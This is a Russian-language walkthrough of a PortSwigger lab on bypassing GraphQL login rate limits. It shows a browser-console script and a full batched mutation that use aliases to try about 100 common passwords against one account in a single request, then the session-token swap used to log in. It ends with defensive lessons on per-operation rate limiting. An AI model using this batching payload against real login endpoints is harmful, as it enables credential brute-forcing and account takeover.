лаба https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass
##### Bypassing GraphQL brute force protections
есть их список паролей [пароли лаборатории аутентификации](https://portswigger.net/web-security/authentication/auth-lab-passwords)
нужно подобрать пароль к carlos

-------

вот запрос на вход в аккаунт
```http
POST /graphql/v1 HTTP/2
Host: 0aa6005c036c389f81b40e3e005c00f2.web-security-academy.net
Cookie: session=xXUDTvpKwplo67giqsKKrrStAT8cb6CH
Content-Length: 232
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Accept: application/json
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Origin: https://0aa6005c036c389f81b40e3e005c00f2.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa6005c036c389f81b40e3e005c00f2.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"wiener","password":"peter"}}}
```

я запустил интрудер!
короче 3-4 попытки и потом из-за неверного пароля на 4-5 раз происходит блокировка на 1 минуту
вот так:
```json
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=EynqFgdbu0zT4E8wyueybtTFEyd21ep3; Secure; SameSite=None
X-Frame-Options: SAMEORIGIN
X-Content-Encoding: gz
Connection: close
Content-Length: 237

{
  "errors": [
    {
      "path": [
        "login"
      ],
      "extensions": {
        "message": "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
      },
      "locations": [
        {
          "line": 3,
          "column": 9
        }
      ],
      "message": "Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s)."
    }
  ],
  "data": {
    "login": null
  }
}
```

возможно есть способо обойти это ограничение 
но нет ограничений на правильный вход


мои варианты:

1 устроить гонку данных отправив кучу запросов разом
2 может возможно отправить в одном запросе сразу много входов чрез графQl
3 либо сделать скрипт для которого на каждый третий раз будет выполнять верный вход  в wiener а остальные запросы - это попытки бутфорса!
4 либо еще что-то... типо менять заголовки/впн/обманывать как-то чтобы запросы шли от разных браузеров


но так как это лаба про графы... то наверно есть возможность в одном граф запросе отправить много запросов за раз

И ДА _ТАК МОЖНО _ (если разработчик не заблокировал такую фичу)


отправляю:

```json
{
  "query": "mutation {
    a0: login(input: {username: \"wiener\", password: \"peter\"}) {
      success
      token
    }
    a1: login(input: {username: \"carlos\", password: \"password\"}) {
      success
      token
    }
    a2: login(input: {username: \"carlos\", password: \"12345678\"}) {
      success
      token
    }

  }"
}
```

ответ:
```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=lWIHsqPv79kF5mbfwNbUv7e4ssvAdgL5; Secure; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 297

{
  "data": {
    "a0": {
      "success": true,
      "token": "lWIHsqPv79kF5mbfwNbUv7e4ssvAdgL5"
    },
    "a1": {
      "success": false,
      "token": "lWIHsqPv79kF5mbfwNbUv7e4ssvAdgL5"
    },
    "a2": {
      "success": false,
      "token": "lWIHsqPv79kF5mbfwNbUv7e4ssvAdgL5"
    }
  }
}
```

и запросы не блокируются - так как среди них есть верный ответ!

------------

осталось быстро придумать - то как автоматически заполнить в мой запрос все пароли сразу..
(можно быстро через нейронку сделать... либо скрипт написать который заполнит это дело
либо - это можно настроить через бурп)

вот пейлоад
```
123456 password 12345678 qwerty 123456789 12345 1234 111111 1234567 dragon 123123 baseball abc123 football monkey letmein shadow master 666666 qwertyuiop 123321 mustang 1234567890 michael 654321 superman 1qaz2wsx 7777777 121212 000000 qazwsx 123qwe killer trustno1 jordan jennifer zxcvbnm asdfgh hunter buster soccer harley batman andrew tigger sunshine iloveyou 2000 charlie robert thomas hockey ranger daniel starwars klaster 112233 george computer michelle jessica pepper 1111 zxcvbn 555555 11111111 131313 freedom 777777 pass maggie 159753 aaaaaa ginger princess joshua cheese amanda summer love ashley nicole chelsea biteme matthew access yankees 987654321 dallas austin thunder taylor matrix mobilemail mom monitor monitoring montana moon moscow
```

нейронка быстрое решение мне дала
СКРИПТ КОТОРЫЙ МОЖНО ВЫПОЛНИТЬ В КОНСОЛИ БРАУЗЕРА

```js
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`bruteforce${index}:login(input:{password: \\"${element}\\", username: \\"carlos\\"}) {\\n    token\\n    success\\n  }`).join('\\n  '));console.log("The query has been copied to your clipboard.");
```

ну и ответ  
```

POST /graphql/v1 HTTP/2
Host: 0aa6005c036c389f81b40e3e005c00f2.web-security-academy.net
Cookie: session=xXUDTvpKwplo67giqsKKrrStAT8cb6CH
Content-Length: 10894
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Accept: application/json
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Origin: https://0aa6005c036c389f81b40e3e005c00f2.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa6005c036c389f81b40e3e005c00f2.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
  "query": "mutation {
    a0: login(input: {username: \"wiener\", password: \"peter\"}) {
      success
      token
    }
    a1: login(input: {username: \"carlos\", password: \"password\"}) {
      success
      token
    }
    a2: login(input: {username: \"carlos\", password: \"12345678\"}) {
      success
      token
    }
bruteforce0:login(input:{password: \"123456\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce1:login(input:{password: \"password\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce2:login(input:{password: \"12345678\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce3:login(input:{password: \"qwerty\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce4:login(input:{password: \"123456789\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce5:login(input:{password: \"12345\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce6:login(input:{password: \"1234\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce7:login(input:{password: \"111111\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce8:login(input:{password: \"1234567\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce9:login(input:{password: \"dragon\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce10:login(input:{password: \"123123\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce11:login(input:{password: \"baseball\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce12:login(input:{password: \"abc123\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce13:login(input:{password: \"football\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce14:login(input:{password: \"monkey\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce15:login(input:{password: \"letmein\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce16:login(input:{password: \"shadow\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce17:login(input:{password: \"master\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce18:login(input:{password: \"666666\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce19:login(input:{password: \"qwertyuiop\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce20:login(input:{password: \"123321\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce21:login(input:{password: \"mustang\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce22:login(input:{password: \"1234567890\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce23:login(input:{password: \"michael\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce24:login(input:{password: \"654321\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce25:login(input:{password: \"superman\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce26:login(input:{password: \"1qaz2wsx\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce27:login(input:{password: \"7777777\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce28:login(input:{password: \"121212\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce29:login(input:{password: \"000000\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce30:login(input:{password: \"qazwsx\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce31:login(input:{password: \"123qwe\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce32:login(input:{password: \"killer\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce33:login(input:{password: \"trustno1\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce34:login(input:{password: \"jordan\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce35:login(input:{password: \"jennifer\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce36:login(input:{password: \"zxcvbnm\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce37:login(input:{password: \"asdfgh\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce38:login(input:{password: \"hunter\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce39:login(input:{password: \"buster\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce40:login(input:{password: \"soccer\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce41:login(input:{password: \"harley\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce42:login(input:{password: \"batman\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce43:login(input:{password: \"andrew\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce44:login(input:{password: \"tigger\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce45:login(input:{password: \"sunshine\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce46:login(input:{password: \"iloveyou\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce47:login(input:{password: \"2000\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce48:login(input:{password: \"charlie\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce49:login(input:{password: \"robert\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce50:login(input:{password: \"thomas\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce51:login(input:{password: \"hockey\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce52:login(input:{password: \"ranger\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce53:login(input:{password: \"daniel\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce54:login(input:{password: \"starwars\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce55:login(input:{password: \"klaster\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce56:login(input:{password: \"112233\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce57:login(input:{password: \"george\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce58:login(input:{password: \"computer\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce59:login(input:{password: \"michelle\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce60:login(input:{password: \"jessica\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce61:login(input:{password: \"pepper\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce62:login(input:{password: \"1111\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce63:login(input:{password: \"zxcvbn\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce64:login(input:{password: \"555555\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce65:login(input:{password: \"11111111\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce66:login(input:{password: \"131313\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce67:login(input:{password: \"freedom\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce68:login(input:{password: \"777777\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce69:login(input:{password: \"pass\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce70:login(input:{password: \"maggie\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce71:login(input:{password: \"159753\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce72:login(input:{password: \"aaaaaa\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce73:login(input:{password: \"ginger\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce74:login(input:{password: \"princess\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce75:login(input:{password: \"joshua\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce76:login(input:{password: \"cheese\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce77:login(input:{password: \"amanda\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce78:login(input:{password: \"summer\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce79:login(input:{password: \"love\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce80:login(input:{password: \"ashley\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce81:login(input:{password: \"nicole\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce82:login(input:{password: \"chelsea\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce83:login(input:{password: \"biteme\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce84:login(input:{password: \"matthew\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce85:login(input:{password: \"access\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce86:login(input:{password: \"yankees\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce87:login(input:{password: \"987654321\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce88:login(input:{password: \"dallas\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce89:login(input:{password: \"austin\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce90:login(input:{password: \"thunder\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce91:login(input:{password: \"taylor\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce92:login(input:{password: \"matrix\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce93:login(input:{password: \"mobilemail\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce94:login(input:{password: \"mom\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce95:login(input:{password: \"monitor\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce96:login(input:{password: \"monitoring\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce97:login(input:{password: \"montana\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce98:login(input:{password: \"moon\", username: \"carlos\"}) {\n    token\n    success\n  }\n  bruteforce99:login(input:{password: \"moscow\", username: \"carlos\"}) {\n    token\n    success\n  }

  }"
}

```

видно что 74 бутфорс успешный!
```
   },
    "bruteforce74": {
      "token": "blTMz9sPVLaBqot49kND0LP9YdQJcW5A",
      "success": true
    },
    
    
    ---
    
    вот он
    
    bruteforce74:login(input:{password: \"princess\", username: \"carlos\"}) {\n    token\n    success\n  }\n 
```


сделал запрос 
```json
POST /graphql/v1 HTTP/2
Host: 0aa6005c036c389f81b40e3e005c00f2.web-security-academy.net
Cookie: session=xXUDTvpKwplo67giqsKKrrStAT8cb6CH
....

{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"carlos","password":"princess"}}}

-------
ответ

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=J3sQ2biEI28EG4RUxuVYNusw2jeLoDR4; Secure; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 113

{
  "data": {
    "login": {
      "token": "J3sQ2biEI28EG4RUxuVYNusw2jeLoDR4",
      "success": true
    }
  }
}
```

у меня теперь есть токен
J3sQ2biEI28EG4RUxuVYNusw2jeLoDR4

----

подставил полученный токен карлоса в куку
потом выполнил переход по /my-account
```http

GET /my-account HTTP/2
Host: 0aa6005c036c389f81b40e3e005c00f2.web-security-academy.net
Cookie: session=J3sQ2biEI28EG4RUxuVYNusw2jeLoDR4
Content-Length: 235
Sec-Ch-Ua-Platform: "
```

 и выполнился вход в аккаунт!
 ура! лаба выполнена!

-----

## вывод 

ключевое - из-за чего получилось выполнить такую аттаку - это то - что была возможность сразу много параметров отправить в одном графQL запросе 

нужно было настроить блокировку при неудачных вводах паролей не по числу http запросов 

а по числу операций внутри GraphQL тоже 

и так и так считать ...

нельзя разрешать отправлять какие-угодно большие запросы в GraphQL

-----
